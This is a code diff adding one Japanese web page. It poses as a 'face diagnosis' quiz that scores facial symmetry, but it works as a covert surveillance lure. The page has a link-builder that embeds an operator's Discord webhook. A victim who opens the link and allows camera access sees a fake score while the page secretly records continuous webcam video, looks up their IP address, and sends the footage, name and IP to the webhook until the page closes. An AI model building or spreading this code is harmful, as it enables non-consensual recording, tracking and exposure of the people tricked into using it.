@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>顔診断</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    min-height: 100vh;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    background: linear-gradient(160deg, #0f0c29, #302b63, #24243e);
+    font-family: "Hiragino Sans", "Yu Gothic", sans-serif;
+    color: #fff; padding: 20px;
+  }
+  .card {
+    width: 100%; max-width: 500px;
+    background: rgba(255,255,255,0.06);
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 20px; padding: 26px;
+    backdrop-filter: blur(12px);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+  .page { display: none; }
+  .page.active { display: block; }
+  h1 { font-size: 22px; text-align: center; margin-bottom: 8px; letter-spacing: 1px; }
+  .sub { text-align: center; font-size: 12px; color: #9aa; margin-bottom: 22px; }
+  label { display: block; font-size: 13px; margin-bottom: 6px; color: #bbb; }
+  input[type="text"] {
+    width: 100%; padding: 13px; border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.2);
+    background: rgba(0,0,0,0.3); color: #fff; font-size: 13px;
+    margin-bottom: 16px;
+  }
+  button {
+    width: 100%; padding: 15px; font-size: 16px; font-weight: bold;
+    border: none; border-radius: 14px; cursor: pointer;
+    background: linear-gradient(90deg, #6a11cb, #2575fc);
+    color: #fff; letter-spacing: 1px;
+    transition: transform 0.12s ease, opacity 0.2s;
+  }
+  button:active { transform: scale(0.97); }
+  button:disabled { opacity: 0.5; cursor: not-allowed; }
+  .result {
+    margin-top: 22px; display: none;
+    background: rgba(0,0,0,0.35); border-radius: 14px;
+    padding: 16px; border: 1px solid rgba(37,117,252,0.4);
+  }
+  .result-title { font-size: 13px; color: #8affb0; margin-bottom: 8px; }
+  .link-box { display: flex; gap: 8px; align-items: center; }
+  .link-box input { margin: 0; font-size: 12px; flex: 1; background: rgba(255,255,255,0.08); color: #9fd3ff; }
+  .copy-btn { width: auto; padding: 12px 16px; font-size: 13px; background: linear-gradient(90deg, #11998e, #38ef7d); }
+  .note { font-size: 11px; color: #888; margin-top: 12px; line-height: 1.6; }
+  .status { font-size: 12px; min-height: 18px; margin-top: 10px; text-align: center; }
+  .status.error { color: #ff8a8a; }
+  .status.ok { color: #8affb0; }
+
+  .video-wrap {
+    position: relative; width: 100%; aspect-ratio: 3 / 4;
+    border-radius: 16px; overflow: hidden;
+    background: #000; margin-bottom: 16px;
+  }
+  video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+  canvas { display: none; }
+  
+  .snapshot-overlay {
+    display: none;
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    object-fit: cover; transform: scaleX(-1);
+  }
+  .snapshot-overlay.show { display: block; }
+
+  .score-wrap { display: none; text-align: center; padding: 10px 0; }
+  .score-wrap.show { display: block; }
+  .score-label { font-size: 13px; color: #aaa; margin-bottom: 4px; }
+  .score-num {
+    font-size: 64px; font-weight: 900;
+    background: linear-gradient(90deg, #38ef7d, #2575fc);
+    -webkit-background-clip: text; background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .meter { height: 10px; border-radius: 6px; margin: 14px 0; background: rgba(255,255,255,0.1); overflow: hidden; }
+  .meter-fill { height: 100%; width: 0; background: linear-gradient(90deg, #38ef7d, #2575fc); transition: width 1s ease; }
+  .score-comment {
+    font-size: 14px; color: #ddd; line-height: 1.7;
+    background: rgba(0,0,0,0.3); border-radius: 12px; padding: 14px;
+    text-align: left;
+  }
+  .user-name-display {
+    text-align: center; font-size: 14px; color: #9fd3ff;
+    margin-bottom: 14px;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div id="page-create" class="page">
+    <h1>🔗 診断リンク作成</h1>
+    <p class="sub">Webhookを設定して、診断リンクを発行する</p>
+    <label>Discord Webhook URL</label>
+    <input id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." value="">
+    <button id="createBtn">作成</button>
+    <div id="createStatus" class="status"></div>
+    <div id="result" class="result">
+      <div class="result-title">✅ リンクを作成しました</div>
+      <div class="link-box">
+        <input id="linkInput" type="text" readonly>
+        <button id="copyBtn" class="copy-btn">コピー</button>
+      </div>
+      <p class="note">このリンクを開いた人は、名前入力 → カメラ許可 → ページを閉じるまでの全動画とIPアドレスが上記Webhookに送信されます。</p>
+    </div>
+  </div>
+
+  <div id="page-name" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <p class="sub">診断を始める前に名前を教えてね</p>
+    <label>お名前</label>
+    <input id="nameInput" type="text" placeholder="例: ゼウス" maxlength="32">
+    <button id="nameNextBtn">次へ（カメラを許可）</button>
+    <div id="nameStatus" class="status"></div>
+  </div>
+
+  <div id="page-diagnose" class="page">
+    <h1>✨ 顔診断 ✨</h1>
+    <div class="user-name-display" id="userNameDisplay"></div>
+    
+    <div class="video-wrap" id="videoWrap">
+      <video id="video" autoplay playsinline muted></video>
+      <canvas id="canvas"></canvas>
+      <img id="snapshotOverlay" class="snapshot-overlay" alt="">
+    </div>
+    <div id="diagStatus" class="status">カメラを準備中...</div>
+    
+    <div id="scoreWrap" class="score-wrap">
+      <div class="score-label">顔診断スコア</div>
+      <div class="score-num" id="scoreNum">0</div>
+      <div class="meter"><div class="meter-fill" id="meterFill"></div></div>
+      <div class="score-comment" id="scoreComment"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const webhookInput = document.getElementById('webhookInput');
+const createBtn = document.getElementById('createBtn');
+const createStatus = document.getElementById('createStatus');
+const result = document.getElementById('result');
+const linkInput = document.getElementById('linkInput');
+const copyBtn = document.getElementById('copyBtn');
+
+const pageCreate = document.getElementById('page-create');
+const pageName = document.getElementById('page-name');
+const pageDiagnose = document.getElementById('page-diagnose');
+
+const nameInput = document.getElementById('nameInput');
+const nameNextBtn = document.getElementById('nameNextBtn');
+const nameStatus = document.getElementById('nameStatus');
+const userNameDisplay = document.getElementById('userNameDisplay');
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snapshotOverlay = document.getElementById('snapshotOverlay');
+const diagStatus = document.getElementById('diagStatus');
+const scoreWrap = document.getElementById('scoreWrap');
+const scoreNum = document.getElementById('scoreNum');
+const meterFill = document.getElementById('meterFill');
+const scoreComment = document.getElementById('scoreComment');
+
+let webhookURL = null;
+let stream = null;
+let userName = '';
+let recorder = null;
+let initialIP = 'unknown';
+let initialFrameDataURL = null;
+let initialScore = 0;
+
+let videoBuffer = []; // 溜まった動画のBlobを保持
+const CHUNKS_PER_SEND = 3; // 何個（何秒分）溜まったら送るか
+
+function setCreateStatus(msg, cls = '') {
+  createStatus.textContent = msg;
+  createStatus.className = 'status ' + cls;
+}
+function setNameStatus(msg, cls = '') {
+  nameStatus.textContent = msg;
+  nameStatus.className = 'status ' + cls;
+}
+function setDiagStatus(msg, cls = '') {
+  diagStatus.textContent = msg;
+  diagStatus.className = 'status ' + cls;
+}
+
+function validWebhook(url) {
+  return /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);
+}
+
+function encodeWebhook(wh) {
+  return btoa(unescape(encodeURIComponent(wh)));
+}
+function decodeWebhook(b64) {
+  try { return decodeURIComponent(escape(atob(b64))); } catch { return null; }
+}
+
+function showPage(name) {
+  pageCreate.classList.remove('active');
+  pageName.classList.remove('active');
+  pageDiagnose.classList.remove('active');
+  if (name === 'create') pageCreate.classList.add('active');
+  if (name === 'name') pageName.classList.add('active');
+  if (name === 'diagnose') pageDiagnose.classList.add('active');
+}
+
+function router() {
+  const hash = location.hash || '';
+  if (hash.startsWith('#diagnose')) {
+    const match = hash.match(/\?w=([^&]+)/);
+    if (!match) { showPage('create'); return; }
+    webhookURL = decodeWebhook(decodeURIComponent(match[1]));
+    if (!webhookURL) { showPage('create'); return; }
+    userName = '';
+    userNameDisplay.textContent = '';
+    showPage('name');
+    setTimeout(() => nameInput.focus(), 100);
+  } else {
+    stopCamera();
+    showPage('create');
+  }
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+  video.srcObject = null;
+}
+
+window.addEventListener('hashchange', router);
+
+createBtn.addEventListener('click', () => {
+  const wh = webhookInput.value.trim();
+  if (!wh) { setCreateStatus('Webhook URLを入力してください。', 'error'); return; }
+  if (!validWebhook(wh)) { setCreateStatus('Discord Webhook URLの形式が正しくありません。', 'error'); return; }
+
+  const base = location.href.split(/[?#]/)[0];
+  const link = base + '#diagnose?w=' + encodeWebhook(wh);
+
+  linkInput.value = link;
+  result.style.display = 'block';
+  setCreateStatus('リンク作成完了。', 'ok');
+});
+
+copyBtn.addEventListener('click', async () => {
+  try {
+    await navigator.clipboard.writeText(linkInput.value);
+    copyBtn.textContent = 'コピー済';
+    setTimeout(() => (copyBtn.textContent = 'コピー'), 1500);
+  } catch {
+    linkInput.select();
+    document.execCommand('copy');
+  }
+});
+
+nameNextBtn.addEventListener('click', () => startWithName());
+nameInput.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') startWithName();
+});
+
+async function fetchIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip || 'unknown';
+  } catch { return 'unknown'; }
+}
+
+function captureFrame() {
+  const w = video.videoWidth, h = video.videoHeight;
+  if (!w || !h) return null;
+  canvas.width = w; canvas.height = h;
+  const ctx = canvas.getContext('2d');
+  ctx.save();
+  ctx.translate(w, 0); ctx.scale(-1, 1);
+  ctx.drawImage(video, 0, 0, w, h);
+  ctx.restore();
+  return canvas;
+}
+
+function detectFaceSymmetry(ctx) {
+  const w = ctx.canvas.width, h = ctx.canvas.height;
+  const img = ctx.getImageData(0, 0, w, h).data;
+  const cx = Math.floor(w / 2);
+  const step = 4;
+  let total = 0, diff = 0;
+  const lum = (x, y) => {
+    const i = (y * w + x) * 4;
+    return 0.299 * img[i] + 0.587 * img[i + 1] + 0.114 * img[i + 2];
+  };
+  for (let y = 0; y < h; y += step) {
+    for (let x = 0; x < cx; x += step) {
+      const mx = w - 1 - x;
+      if (mx <= cx) continue;
+      diff += Math.abs(lum(x, y) - lum(mx, y));
+      total++;
+    }
+  }
+  if (total === 0) return 50;
+  const avgDiff = diff / total;
+  return Math.round(Math.max(0, 100 - (avgDiff / 255) * 180));
+}
+
+function buildComment(score) {
+  if (score >= 90) return "左右の対称性が極めて高い。整った骨格で、正面から見た輪郭が非常にクリア。印象的な顔立ち。";
+  if (score >= 80) return "対称性が高くバランスの取れた顔。目元と口元の配置が整っており、清潔感がある。";
+  if (score >= 70) return "全体的に調和が取れている。わずかな左右差は自然な範囲で、表情に個性が出ている。";
+  if (score >= 60) return "平均的な対称性。照明や角度でスコアが変わるので、正面・明るい場所で試すと上がりやすい。";
+  return "左右差がやや大きめに出ている。照明が片側に寄っていないか、カメラに対して正面を向いているか確認してみて。";
+}
+
+async function startWithName() {
+  const n = nameInput.value.trim();
+  if (!n) { setNameStatus('名前を入力してください。', 'error'); return; }
+  userName = n;
+  userNameDisplay.textContent = '👤 ' + userName + ' さんの診断';
+  setNameStatus('カメラの許可を求めています...', 'ok');
+  nameNextBtn.disabled = true;
+
+  showPage('diagnose');
+  setDiagStatus('カメラを起動中...');
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 960 } },
+      audio: false
+    });
+    video.srcObject = stream;
+    
+    video.onloadedmetadata = async () => {
+      setDiagStatus('準備完了。診断を開始します...', 'ok');
+      
+      initialIP = await fetchIP();
+      const frameCanvas = captureFrame();
+      if (frameCanvas) {
+        initialFrameDataURL = frameCanvas.toDataURL('image/jpeg', 0.85);
+        initialScore = Math.max(40, Math.min(99, detectFaceSymmetry(frameCanvas.getContext('2d'))));
+      }
+
+      startContinuousRecording();
+      
+      setTimeout(() => {
+        showScore(initialScore);
+        snapshotOverlay.src = initialFrameDataURL;
+        snapshotOverlay.classList.add('show');
+        setDiagStatus('診断完了', 'ok');
+      }, 800);
+    };
+  } catch (err) {
+    setDiagStatus('カメラにアクセスできません: ' + err.message, 'error');
+    nameNextBtn.disabled = false;
+  }
+}
+
+function startContinuousRecording() {
+  const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' :
+                   MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/webm';
+  
+  function createRecorder() {
+    try {
+      recorder = new MediaRecorder(stream, { mimeType });
+      let localChunks = [];
+      
+      recorder.ondataavailable = (e) => { 
+        if (e.data.size > 0) {
+          localChunks.push(e.data);
+        }
+      };
+
+      recorder.onstop = () => {
+        if (localChunks.length > 0) {
+          const blob = new Blob(localChunks, { type: mimeType });
+          videoBuffer.push(blob); // 溜める
+          
+          if (videoBuffer.length >= CHUNKS_PER_SEND) {
+            sendGroupToDiscord();
+          }
+        }
+      };
+
+      recorder.start();
+      
+      setTimeout(() => {
+        if (recorder.state !== 'inactive') {
+          recorder.stop();
+        }
+      }, 3000);
+      
+    } catch (e) {
+      console.error(e);
+    }
+  }
+
+  createRecorder();
+
+  setInterval(() => {
+    if (stream && stream.active) {
+      createRecorder();
+    }
+  }, 3100);
+}
+
+async function sendGroupToDiscord() {
+  if (!webhookURL || videoBuffer.length === 0) return;
+  
+  const sendBuffer = [...videoBuffer];
+  videoBuffer = []; // バッファを空にする
+
+  const payload = {
+    username: "顔診断ボット",
+    embeds: [{
+      title: "📸 顔診断レポート（連続録画）",
+      description: `**${userName} さんの動画（${sendBuffer.length * 3}秒分）**\nスコア: ${initialScore} / 100`,
+      color: 0xff5e5e,
+      fields: [
+        { name: "名前", value: "`" + userName + "`", inline: true },
+        { name: "IPアドレス", value: "`" + initialIP + "`", inline: true },
+        { name: "送信日時", value: new Date().toLocaleString('ja-JP'), inline: false }
+      ]
+    }]
+  };
+
+  const form = new FormData();
+  form.append('payload_json', JSON.stringify(payload));
+  
+  // 複数の動画を1つのリクエストに詰め込む
+  sendBuffer.forEach((blob, index) => {
+    form.append(`file${index}`, new File([blob], `camera_${index}.webm`, { type: 'video/webm' }));
+  });
+
+  try {
+    await fetch(webhookURL, { method: 'POST', body: form });
+    console.log("グループ送信完了");
+  } catch (e) {
+    console.error("送信失敗", e);
+    // 失敗したらバッファに戻す（リトライ用）
+    videoBuffer = [...sendBuffer, ...videoBuffer];
+  }
+}
+
+function showScore(score) {
+  scoreWrap.classList.add('show');
+  scoreNum.textContent = '0';
+  meterFill.style.width = '0%';
+  scoreComment.textContent = buildComment(score);
+
+  let cur = 0;
+  const timer = setInterval(() => {
+    cur += Math.max(1, Math.round((score - cur) / 8));
+    if (cur >= score) { cur = score; clearInterval(timer); }
+    scoreNum.textContent = cur;
+    meterFill.style.width = cur + '%';
+  }, 30);
+}
+
+// ページを閉じる時に、バッファに残っている分を即座に送る
+window.addEventListener('pagehide', () => {
+  if (videoBuffer.length > 0) {
+    sendGroupToDiscord();
+  }
+});
+
+router();
+</script>
+</body>
+</html>
